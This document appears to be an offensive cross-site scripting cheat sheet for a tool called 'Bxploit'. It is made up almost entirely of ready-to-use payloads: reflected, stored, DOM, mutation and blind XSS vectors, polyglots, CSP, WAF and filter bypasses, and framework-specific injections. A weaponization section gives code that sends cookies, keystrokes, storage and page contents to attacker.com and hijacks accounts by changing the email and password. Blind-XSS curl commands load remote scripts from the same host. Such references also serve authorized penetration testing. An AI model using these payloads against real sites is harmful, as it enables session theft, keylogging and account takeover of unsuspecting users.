# XSS Complete Arsenal

> Bxploit knowledge module — Cross-Site Scripting (XSS) complete offensive reference.
> Covers Reflected, Stored, DOM, Mutation, Blind XSS, polyglot payloads, CSP bypass, event handlers, SVG/MathML vectors, filter evasion, and framework-specific XSS.

---

## 1. Reflected XSS

Payload is reflected from the HTTP request into the response without sanitization.

### 1.1 Basic Injection Points

```html
<!-- URL parameter reflection -->
https://target.com/search?q=<script>alert(document.domain)</script>

<!-- Inside HTML attribute -->
https://target.com/page?name=" onfocus=alert(1) autofocus="

<!-- Inside href/src attribute -->
https://target.com/redirect?url=javascript:alert(document.cookie)

<!-- Inside JavaScript string context -->
https://target.com/page?callback=';alert(1)//

<!-- Inside JS template literal -->
https://target.com/page?msg=${alert(document.domain)}
```

### 1.2 Context-Specific Breakouts

```html
<!-- Breaking out of HTML tag -->
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
'><svg/onload=alert(1)>

<!-- Breaking out of JavaScript string -->
';alert(1)//
";alert(1)//
\';alert(1)//
</script><script>alert(1)</script>

<!-- Breaking out of HTML comment -->
--><script>alert(1)</script><!--

<!-- Breaking out of textarea/title/style/noscript -->
</textarea><script>alert(1)</script>
</title><script>alert(1)</script>
</style><script>alert(1)</script>
</noscript><script>alert(1)</script>

<!-- Breaking out of iframe srcdoc -->
"><img src=x onerror=alert(1)>
```

### 1.3 Detection with Tools

```bash
# Dalfox — automated reflected XSS scanner
dalfox url "https://target.com/search?q=test" --blind https://your-bxss-server.com
dalfox file urls.txt --skip-bav --deep-domxss --follow-redirects
dalfox url "https://target.com/search?q=test" -w /usr/share/wordlists/xss-payloads.txt

# XSStrike — advanced XSS detection
python3 xsstrike.py -u "https://target.com/search?q=test" --crawl -l 3
python3 xsstrike.py -u "https://target.com/page" --data "name=test&email=test" --fuzzer

# kxss — fast parameter reflection checker
echo "https://target.com/search?q=test" | kxss

# Gxss — tag reflection tester
echo "https://target.com/search?q=test" | Gxss -p test

# qsreplace + freq for mass testing
cat urls.txt | qsreplace '"><img src=x onerror=alert(1)>' | freq
```

---

## 2. Stored (Persistent) XSS

Payload is stored server-side and rendered to other users.

### 2.1 Common Injection Surfaces

```
- User profile fields (name, bio, website, location)
- Comments, forum posts, reviews
- File upload names and metadata (EXIF, filename)
- Email subjects/bodies (webmail clients)
- Chat messages, direct messages
- Support tickets
- Shared documents/notes
- Calendar event titles/descriptions
- Webhook URLs and names
- API keys/token names
- Notification content
- RSS/Atom feed entries
- SVG file uploads
- Markdown rendering fields
- JSON data rendered in dashboards
```

### 2.2 Stored XSS via File Upload

```bash
# SVG file with embedded JS
cat > payload.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100"/>
</svg>
EOF

# SVG with fetch-based exfiltration
cat > exfil.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker.com/steal?c='+document.cookie)
  </script>
</svg>
EOF

# HTML file disguised as image
echo '<html><body><script>alert(document.domain)</script></body></html>' > image.html
# Upload with Content-Type manipulation

# EXIF metadata XSS
exiftool -Comment='<script>alert(1)</script>' image.jpg
exiftool -Artist='"><img src=x onerror=alert(1)>' photo.png

# PDF with JavaScript
# Use a PDF with OpenAction executing JS — triggers in inline viewers

# Filename-based XSS
touch '"><img src=x onerror=alert(1)>.png'
```

### 2.3 Markdown-Based XSS

```markdown
<!-- Many renderers fail to sanitize these -->
[Click me](javascript:alert(document.domain))
[xss](vbscript:alert(1))
[xss](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

![img](x" onerror="alert(1))
![img](https://attacker.com/x.png"onload="alert(1))

<!-- Header injection with HTML -->
# <img src=x onerror=alert(1)>

<!-- Link reference with JS URI -->
[click]: javascript:alert(1)
```

---

## 3. DOM-Based XSS

Payload never touches the server; vulnerability exists entirely in client-side JavaScript.

### 3.1 Dangerous Sources

```javascript
// Sources — where attacker-controlled data enters
document.URL
document.documentURI
document.referrer
document.baseURI
location.href
location.search
location.hash
location.pathname
window.name
document.cookie
localStorage.getItem()
sessionStorage.getItem()
IndexedDB
Web Messaging (postMessage)
history.pushState() / history.replaceState()
```

### 3.2 Dangerous Sinks

```javascript
// Sinks — where data gets executed
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
element.srcdoc
eval()
setTimeout(string)
setInterval(string)
Function(string)
new Function(string)
window.location
window.location.href
window.location.assign()
window.location.replace()
document.domain
element.src
element.action
element.href
element.setAttribute('onclick', ...)
jQuery.html()
jQuery.append()
jQuery.prepend()
jQuery.after()
jQuery.before()
jQuery.replaceWith()
jQuery.wrap()
jQuery.wrapAll()
jQuery.parseHTML()
$.globalEval()
angular.element()
React.dangerouslySetInnerHTML
Vue v-html directive
```

### 3.3 DOM XSS Payloads

```
# Hash-based DOM XSS
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page#javascript:alert(1)

# Fragment identifier injection
https://target.com/page#"><svg/onload=alert(1)>

# document.write sink
https://target.com/page?default=<script>alert(document.domain)</script>

# innerHTML sink
https://target.com/page#<img src=x onerror=alert(1)>

# location.href sink (open redirect to XSS)
https://target.com/page?next=javascript:alert(1)

# window.name sink
# 1. Set window.name on attacker page:
<script>window.name="<img src=x onerror=alert(1)>";location="https://target.com/vulnerable";</script>

# postMessage sink
<iframe src="https://target.com/vulnerable" onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')">
```

### 3.4 DOM XSS Discovery

```bash
# DOM Invader (Burp Suite extension) — interactive DOM XSS testing

# Manual: search for dangerous patterns in JS
grep -rn 'innerHTML\|outerHTML\|document\.write\|\.html(' target_js_files/
grep -rn 'eval(\|setTimeout(\|setInterval(\|Function(' target_js_files/
grep -rn 'location\.hash\|location\.search\|location\.href' target_js_files/
grep -rn 'postMessage\|addEventListener.*message' target_js_files/

# Retire.js — find vulnerable JS libraries
retire --js --path /path/to/js/

# Using browser DevTools
# Sources tab > Search across all files for sinks
# Use Ctrl+Shift+F to search all loaded scripts
```

---

## 4. Mutation XSS (mXSS)

Exploits browser HTML parsing quirks where the DOM mutates sanitized input into executable content.

### 4.1 Classic mXSS Vectors

```html
<!-- Backtick breaks attribute parsing in IE/older browsers -->
<img src="x` `<script>alert(1)</script>"` `>

<!-- Namespace confusion (SVG/MathML ↔ HTML) -->
<svg><style><img src=x onerror=alert(1)></style></svg>
<math><style><img src=x onerror=alert(1)></style></math>

<!-- innerHTML re-serialization mutation -->
<svg></p><style><g/onload=alert(1)>

<!-- Template element mutation -->
<svg><template><img src=x onerror=alert(1)></template></svg>

<!-- Table element mutation (browser auto-corrects structure) -->
<table><tr><td><table><tr><td><img src=x onerror=alert(1)>

<!-- form / nobr nesting mutation -->
<form><nobr><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror=alert(1)>

<!-- DOMPurify bypass via mXSS (historical CVE-2020-26870) -->
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=x onerror=alert(1)&gt;">

<!-- Namespace confusion for DOMPurify (CVE-2020-26870 variant) -->
<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]><img src onerror=alert(1)>">

<!-- noscript + innerHTML mutation -->
<!-- When page parsed with scripting enabled vs disabled, noscript content differs -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### 4.2 mXSS Testing Methodology

```
1. Identify sanitizer in use (DOMPurify, Angular $sanitize, custom)
2. Check sanitizer version for known mXSS bypasses
3. Test namespace-switching vectors (svg→html, math→html)
4. Test deeply nested elements that trigger parser correction
5. Test innerHTML re-serialization: set innerHTML, read it back, set it again
6. Check if sanitizer runs before or after DOM insertion
7. Fuzz with nesting combinations: <svg><foreignObject><div>..., <math><mi><table>...
```

---

## 5. Blind XSS

Payload executes in a context you can't directly observe (admin panels, logs, support dashboards).

### 5.1 Blind XSS Platforms

```bash
# XSS Hunter (self-hosted or xsshunter.com)
# Generates payloads that phone home with:
# - Cookies, URL, DOM snapshot, screenshot, user agent, IP

# bxss — blind XSS payload server
bxss -payload '"><script src=https://your-server.com/bxss.js></script>' -server your-server.com

# ezXSS — self-hosted blind XSS platform
# Deploy on VPS, generates callback payloads

# Custom callback payload
"><script>
var i=new Image();
i.src="https://attacker.com/log?cookie="+document.cookie+"&url="+encodeURIComponent(location.href)+"&dom="+encodeURIComponent(document.body.innerHTML.substring(0,500));
</script>
```

### 5.2 Injection Points for Blind XSS

```
- Contact forms / support ticket systems
- User-Agent header (logged by WAFs, analytics)
- Referer header
- X-Forwarded-For / X-Real-IP headers
- Cookie values (logged by error handlers)
- File upload filenames
- API request bodies (viewed in admin dashboards)
- Registration fields (reviewed by admin)
- Feedback/survey forms
- Error reporting systems
- Chat messages to support staff
- Order/shipping notes
- Payment reference fields
```

### 5.3 Header-Based Blind XSS

```bash
# User-Agent injection
curl -A '"><script src=https://attacker.com/x.js></script>' https://target.com/

# Referer injection
curl -H 'Referer: "><script src=https://attacker.com/x.js></script>' https://target.com/

# X-Forwarded-For injection
curl -H 'X-Forwarded-For: "><script src=https://attacker.com/x.js></script>' https://target.com/

# Custom headers that may be logged
curl -H 'X-Custom: <svg/onload=fetch("https://attacker.com/?c="+document.cookie)>' https://target.com/
```

---

## 6. Polyglot XSS Payloads

Single payloads that execute in multiple injection contexts.

### 6.1 Universal Polyglots

```html
<!-- Breaks out of: JS string, HTML attribute, HTML tag, script block, style block -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0telerik%0telerik//telerik</telerik></stYle/telerik</telerik/</texTarEa/</telerik/</titLe/</telerik/><telerik/telerik/oNerRor=alert()// ><telerik src=x><svg/onload=alert(1)//

<!-- Short polyglot -->
'">><marquee><img src=x onerror=alert(1)></marquee></plaintext\></|\><plaintext/onmouseover=alert(1)>

<!-- Rsnake polyglot -->
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

<!-- Compact multi-context polyglot -->
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=alert()//>

<!-- Attribute + tag + JS context polyglot -->
"'--></style></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>

<!-- img-based polyglot -->
<img/src=x/onerror="javascript:alert(1)"///>
```

### 6.2 Context-Aware Polyglots

```html
<!-- Works inside: single-quoted attr, double-quoted attr, unquoted attr, tag body -->
x" autofocus onfocus="alert(1)" x="
x' autofocus onfocus='alert(1)' x='
x autofocus onfocus=alert(1) x=

<!-- JS string + HTML context -->
</script><svg/onload=alert(1)>
'-alert(1)-'
"-alert(1)-"
```

---

## 7. CSP Bypass Techniques

### 7.1 Misconfigured CSP Exploitation

```
# Wildcard / overly broad sources
Content-Security-Policy: script-src 'self' *.googleapis.com

# Exploit: host JSONP/Angular on allowed CDN
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

# unsafe-inline still present
Content-Security-Policy: script-src 'self' 'unsafe-inline'
# Direct script injection works
<script>alert(1)</script>

# unsafe-eval present
Content-Security-Policy: script-src 'self' 'unsafe-eval'
# eval-based execution works
<img src=x onerror="eval('alert(1)')">
```

### 7.2 JSONP Endpoint Abuse

```html
<!-- Google JSONP -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- Common JSONP endpoints on allowed domains -->
<script src="https://subdomain.target.com/api/jsonp?callback=alert(document.domain)"></script>

<!-- Finding JSONP endpoints -->
<!-- Search for: ?callback=, ?jsonp=, ?cb=, ?_callback= -->
```

### 7.3 CSP Bypass via Allowed Libraries

```html
<!-- AngularJS CSP bypass (if angular CDN is allowed) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- Alternative AngularJS bypass -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

<!-- Prototype.js bypass -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<form id="x"><input name="innerHTML" value="&lt;img src=x onerror=alert(1)&gt;"></form>
<script>$('x').update($('x').innerHTML)</script>

<!-- jQuery bypass via $.getScript if same-origin JS upload available -->
<script>$.getScript("//attacker.com/evil.js")</script>
```

### 7.4 CSP Bypass via base-uri

```html
<!-- If base-uri is not restricted -->
<base href="https://attacker.com/">
<!-- All relative script srcs now load from attacker.com -->
```

### 7.5 CSP Bypass via Data URI / Blob

```html
<!-- If data: is allowed in script-src -->
<script src="data:text/javascript,alert(1)"></script>

<!-- Blob URL bypass -->
<script>
var b = new Blob(['alert(document.domain)'], {type: 'text/javascript'});
var u = URL.createObjectURL(b);
var s = document.createElement('script');
s.src = u;
document.body.appendChild(s);
</script>
```

### 7.6 CSP Bypass via Trusted Types / Policy Injection

```html
<!-- Dangling markup to exfiltrate via img (bypasses script-src restrictions) -->
<img src="https://attacker.com/steal?data=

<!-- CSS-based exfiltration (if style-src is permissive) -->
<style>
@import url("https://attacker.com/steal?token=" );
</style>

<!-- meta redirect (if no navigate-to restriction) -->
<meta http-equiv="refresh" content="0;url=https://attacker.com/steal?c=TOKEN">
```

### 7.7 CSP Nonce/Hash Bypass

```html
<!-- Nonce reuse — if nonce is static or predictable -->
<script nonce="KNOWN_NONCE">alert(1)</script>

<!-- Script gadgets — find existing nonced script that uses attacker-controlled input -->
<!-- Example: nonced script reads from URL hash -->
<script nonce="abc123">
  var data = location.hash.slice(1);
  document.getElementById('output').innerHTML = data;
</script>
<!-- Exploit: #<img src=x onerror=alert(1)> -->

<!-- Nonce exfiltration via CSS injection -->
<style>
script[nonce^="a"] { background: url("https://attacker.com/nonce?c=a"); }
script[nonce^="b"] { background: url("https://attacker.com/nonce?c=b"); }
/* ... brute-force character by character */
</style>
```

---

## 8. Event Handler XSS Vectors

### 8.1 Comprehensive Event Handler List

```html
<!-- Mouse events -->
<div onmouseover="alert(1)">hover</div>
<div onmouseenter="alert(1)">hover</div>
<div onmousemove="alert(1)">move</div>
<div onmousedown="alert(1)">click</div>
<div onmouseup="alert(1)">release</div>
<div onclick="alert(1)">click</div>
<div ondblclick="alert(1)">double-click</div>
<div oncontextmenu="alert(1)">right-click</div>
<div onwheel="alert(1)">scroll</div>

<!-- Focus events (auto-trigger) -->
<input onfocus="alert(1)" autofocus>
<input onblur="alert(1)" autofocus><input autofocus>
<select onfocus="alert(1)" autofocus></select>
<textarea onfocus="alert(1)" autofocus></textarea>
<keygen onfocus="alert(1)" autofocus>
<marquee onstart="alert(1)">
<video><source onerror="alert(1)">

<!-- Media events (auto-trigger) -->
<img src=x onerror="alert(1)">
<image src=x onerror="alert(1)">
<video src=x onerror="alert(1)">
<audio src=x onerror="alert(1)">
<object data=x onerror="alert(1)">
<body onload="alert(1)">
<svg onload="alert(1)">
<iframe onload="alert(1)" src="about:blank">
<input oninvalid="alert(1)" required><input type=submit>
<details open ontoggle="alert(1)">
<dialog open onclose="alert(1)">

<!-- Animation events -->
<div style="animation:x" onanimationstart="alert(1)">
<div style="animation:x" onanimationend="alert(1)">
<div style="transition:0.1s" ontransitionend="alert(1)" style="width:1px">

<!-- Form events -->
<form onsubmit="alert(1)"><input type=submit>
<form onreset="alert(1)"><input type=reset>
<input onchange="alert(1)" value="a">
<input oninput="alert(1)">
<select onchange="alert(1)"><option>1</option></select>

<!-- Clipboard -->
<div oncopy="alert(1)">copy me</div>
<div oncut="alert(1)" contenteditable>cut me</div>
<div onpaste="alert(1)" contenteditable>paste here</div>

<!-- Drag and drop -->
<div draggable="true" ondragstart="alert(1)">drag me</div>

<!-- Touch (mobile) -->
<div ontouchstart="alert(1)">touch</div>

<!-- Pointer events -->
<div onpointerover="alert(1)">hover</div>
<div onpointerdown="alert(1)">tap</div>
<div onpointerup="alert(1)">release</div>
```

### 8.2 Auto-Triggering Payloads (No Interaction)

```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video autoplay onloadstart=alert(1)><source src=x>
<details open ontoggle=alert(1)>
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>
<iframe src="javascript:alert(1)">
<math><mtext><img src=x onerror=alert(1)></mtext></math>
```

---

## 9. SVG and MathML Vectors

### 9.1 SVG-Based XSS

```html
<!-- Inline SVG -->
<svg onload="alert(1)">
<svg><script>alert(1)</script></svg>
<svg><animate onbegin="alert(1)" attributeName="x" dur="1s">
<svg><set onbegin="alert(1)" attributeName="x" to="1">
<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a>
<svg><use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">

<!-- SVG foreignObject for HTML injection -->
<svg><foreignObject><body onload="alert(1)"></foreignObject></svg>
<svg><foreignObject><iframe src="javascript:alert(1)"></foreignObject></svg>

<!-- SVG event handlers -->
<svg><rect width="100" height="100" onclick="alert(1)"/>
<svg><circle r="50" onmouseover="alert(1)"/>

<!-- SVG with embedded script via xlink -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script xlink:href="data:,alert(1)"/>
</svg>

<!-- SVG file upload payload (standalone) -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <script type="text/javascript">alert(document.domain)</script>
</svg>
```

### 9.2 MathML-Based XSS

```html
<!-- MathML with event handler -->
<math><mtext><img src=x onerror=alert(1)></mtext></math>

<!-- MathML namespace confusion for mXSS -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>

<!-- MathML href -->
<math><mtext><a href="javascript:alert(1)">click</a></mtext></math>

<!-- MathML xlink -->
<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">click<mtext>1</mtext></maction></math>
```

---

## 10. Filter Evasion Techniques

### 10.1 Case and Encoding Tricks

```html
<!-- Mixed case -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- HTML entity encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>

<!-- Hex encoding in HTML entities -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

<!-- URL encoding (double encoding) -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
%22%20onmouseover%3Dalert(1)%20%22

<!-- Unicode escapes in JavaScript -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

<!-- Octal escapes -->
<script>eval('\141\154\145\162\164\50\61\51')</script>

<!-- Base64 in data URI -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 10.2 Whitespace and Null Byte Tricks

```html
<!-- Tab, newline, carriage return inside tag/attribute names -->
<img/src=x/onerror=alert(1)>
<img	src=x	onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
<img%0dsrc=x%0donerror=alert(1)>
<img%09src=x%09onerror=alert(1)>

<!-- Null bytes (older parsers) -->
<scr%00ipt>alert(1)</scr%00ipt>
<img src=x onerr%00or=alert(1)>

<!-- JavaScript with comments for obfuscation -->
<script>a]lert/**/('XSS')</script>
<script>alert/*comment*/(1)</script>
<script>al\u0065rt(1)</script>

<!-- Newline in event handler -->
<img src=x onerror="
alert(1)
">

<!-- Zero-width characters (bypass keyword filters) -->
<script>al‌ert(1)</script>  <!-- zero-width non-joiner U+200C -->
```

### 10.3 Tag and Attribute Obfuscation

```html
<!-- Slash instead of space -->
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- Missing closing tag -->
<script>alert(1)//
<img src=x onerror=alert(1)//

<!-- Backtick instead of quotes (legacy IE) -->
<img src=x onerror=`alert(1)`>

<!-- JavaScript URI variations -->
<a href="java	script:alert(1)">click</a>
<a href="j&#x41;vascript:alert(1)">click</a>
<a href="javascript&colon;alert(1)">click</a>
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)">click</a>

<!-- Expression-based (legacy IE CSS) -->
<div style="width:expression(alert(1))">
<div style="background:url('javascript:alert(1)')">

<!-- Custom elements / unknown tags -->
<custom-tag onfocus=alert(1) tabindex=1 autofocus>
<x onfocus=alert(1) tabindex=1 id=x>#x

<!-- Mutation-based: parser behavior differences -->
<a""id=a href=javascript:alert(1)>click</a>
<a id="a"name="a"href="javascript:alert(1)">click</a>
```

### 10.4 Keyword Bypass Techniques

```html
<!-- "script" blocked — use event handlers -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- "alert" blocked -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>print()</script>
<script>[].constructor.constructor('return alert(1)')()</script>
<script>window['al'+'ert'](1)</script>
<script>self['al'+'ert'](1)</script>
<script>top[/al/.source+/ert/.source](1)</script>
<script>Reflect.apply(alert,null,[1])</script>
<script>new Function('alert(1)')()</script>
<script>eval.call(null,'alert(1)')</script>

<!-- "document.cookie" blocked -->
<script>alert(document['cookie'])</script>
<script>alert(document['coo'+'kie'])</script>
<script>var a='cooki';alert(document[a+'e'])</script>

<!-- Parentheses blocked -->
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>
<script>setTimeout`alert\x28document.domain\x29`</script>
<script>{onerror=alert}throw{lineNumber:1,columnNumber:1,fileName:1,message:'XSS'}</script>
<img src=x onerror=alert&lpar;1&rpar;>
<img src=x onerror="window.onerror=alert;throw+1">

<!-- Quotes blocked -->
<script>alert(/xss/.source)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(atob('eHNz'))</script>

<!-- Angle brackets blocked (attribute injection context) -->
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
```

### 10.5 WAF Bypass Payloads

```html
<!-- Chunked/fragmented to bypass pattern matching -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Unicode normalization bypass -->
＜script＞alert(1)＜/script＞  <!-- fullwidth angle brackets -->

<!-- IP-based callback for WAF that blocks domains -->
<script src=//0x7f000001/evil.js></script>
<script src=//2130706433/evil.js></script>   <!-- decimal IP -->
<script src=//0177.0.0.1/evil.js></script>   <!-- octal IP -->

<!-- Double URL encoding -->
%253Csvg%2520onload%253Dalert%25281%2529%253E

<!-- Content-Type manipulation for stored XSS -->
<!-- Upload .html with Content-Type: image/png, some servers re-serve as text/html -->
```

---

## 11. Framework-Specific XSS

### 11.1 AngularJS (v1.x)

```html
<!-- Template injection (sandbox bypass varies by version) -->
<!-- v1.0.1–1.1.5 -->
{{constructor.constructor('alert(1)')()}}

<!-- v1.2.0–1.2.1 -->
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

<!-- v1.2.19–1.2.23 -->
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}

<!-- v1.4.0–1.4.9 -->
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

<!-- v1.5.0–1.5.8 -->
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

<!-- v1.6.0+ (no sandbox) -->
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

<!-- CSP bypass with AngularJS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<div ng-app ng-csp>
  {{$eval.constructor('alert(document.domain)')()}}
</div>
```

### 11.2 React

```jsx
// dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}} />
// If userInput is attacker-controlled: <img src=x onerror=alert(1)>

// href with javascript: URI (React >=16.9 warns but doesn't block in all cases)
<a href={userInput}>click</a>
// userInput = "javascript:alert(1)"

// Server-side rendering (SSR) injection
// If user input ends up in SSR output without escaping:
// Injecting into JSON embedded in HTML: </script><script>alert(1)</script>

// React Native WebView
// If loading user-controlled URLs in WebView without sanitization
```

### 11.3 Vue.js

```html
<!-- Template injection (v2) -->
{{constructor.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}

<!-- v-html directive (equivalent to innerHTML) -->
<div v-html="userInput"></div>
<!-- userInput = '<img src=x onerror=alert(1)>' -->

<!-- SSR template injection -->
<!-- If user input is interpolated into Vue template string on server -->
{{_c('script',{domProps:{"innerHTML":"alert(1)"}})}}

<!-- v-bind with javascript: URI -->
<a v-bind:href="userInput">click</a>
<!-- userInput = 'javascript:alert(1)' -->

<!-- Dynamic component with user input -->
<component :is="userInput"></component>
```

### 11.4 jQuery

```javascript
// jQuery selector XSS (versions < 3.0)
$('#' + userInput)  // userInput = "<img src=x onerror=alert(1)>"
$(userInput)         // Creates DOM elements if input starts with <

// .html() sink
$('#element').html(userInput);

// .append() sink
$('#element').append(userInput);

// $.parseHTML without context
$.parseHTML('<img src=x onerror=alert(1)>');

// AJAX response rendered as HTML
$.get('/api/data', function(data) {
    $('#result').html(data);  // If server returns unsanitized HTML
});
```

### 11.5 Ember.js

```html
<!-- Triple-stache (unescaped output) -->
{{{userInput}}}

<!-- SafeString misuse -->
Ember.String.htmlSafe(userInput)

<!-- Ember component attribute injection -->
{{input value=userInput}}
```

### 11.6 Svelte

```html
<!-- @html directive (unescaped) -->
{@html userInput}
<!-- userInput = '<img src=x onerror=alert(1)>' -->

<!-- bind:innerHTML -->
<div bind:innerHTML={userInput}></div>
```

### 11.7 Next.js / Nuxt.js / SSR Frameworks

```html
<!-- SSR hydration mismatch can lead to XSS if server renders user input differently -->
<!-- __NEXT_DATA__ injection -->
<!-- If user input ends up in the JSON payload: -->
</script><script>alert(1)</script>

<!-- getServerSideProps / getStaticProps returning unsanitized data rendered with dangerouslySetInnerHTML -->
```

---

## 12. Advanced Exfiltration and Weaponization

### 12.1 Cookie Stealing

```javascript
// Basic cookie exfiltration
new Image().src="https://attacker.com/steal?c="+document.cookie;

// Fetch-based (modern, silent)
fetch('https://attacker.com/steal',{method:'POST',body:document.cookie});

// Navigator.sendBeacon (survives page unload)
navigator.sendBeacon('https://attacker.com/steal',document.cookie);

// WebSocket exfiltration (bypasses some CSP)
var ws=new WebSocket('wss://attacker.com/ws');ws.onopen=function(){ws.send(document.cookie)};
```

### 12.2 Keylogging

```javascript
document.addEventListener('keypress',function(e){
  new Image().src='https://attacker.com/log?k='+e.key;
});
```

### 12.3 Session Hijacking & Account Takeover

```javascript
// Steal session token and replay
fetch('https://attacker.com/steal?token='+document.cookie);

// Change email/password via CSRF through XSS
fetch('/api/account/update',{
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({email:'attacker@evil.com'}),
  credentials:'include'
});

// Steal CSRF token then perform action
fetch('/profile').then(r=>r.text()).then(t=>{
  var token=t.match(/csrf_token.*?value="(.*?)"/)[1];
  fetch('/api/change-password',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'csrf='+token+'&password=hacked123',
    credentials:'include'
  });
});
```

### 12.4 DOM Data Extraction

```javascript
// Scrape page content
fetch('https://attacker.com/exfil',{
  method:'POST',
  body:JSON.stringify({
    url: location.href,
    html: document.documentElement.outerHTML,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  })
});

// Screenshot via html2canvas (if library is available or injectable)
```

---

## 13. XSS in Uncommon Contexts

### 13.1 XSS in JSON Responses

```
# If Content-Type is text/html or missing, and JSON is reflected:
{"name":"<script>alert(1)</script>"}

# JSONP callback injection
https://target.com/api?callback=alert(1)//

# If response is rendered in browser:
{"search":"</script><script>alert(1)</script>"}
```

### 13.2 XSS in XML/XHTML

```xml
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
```

### 13.3 XSS in HTTP Headers (Response Splitting)

```
# Header injection leading to XSS
GET /page?lang=en%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# X-Forwarded-Host → reflected in page
X-Forwarded-Host: "><script>alert(1)</script>
```

### 13.4 XSS via Open Redirect

```
# Chain open redirect with javascript: URI
https://target.com/redirect?url=javascript:alert(document.domain)

# Or redirect to data: URI
https://target.com/redirect?url=data:text/html,<script>alert(1)</script>
```

### 13.5 XSS in WebSocket Messages

```javascript
// If WebSocket messages are rendered in DOM without sanitization
ws.send('<img src=x onerror=alert(1)>');
```

### 13.6 XSS via CSS Injection

```html
<!-- If style attributes or <style> blocks are injectable -->
<style>
  body { background: url('javascript:alert(1)'); }  /* IE only */
</style>

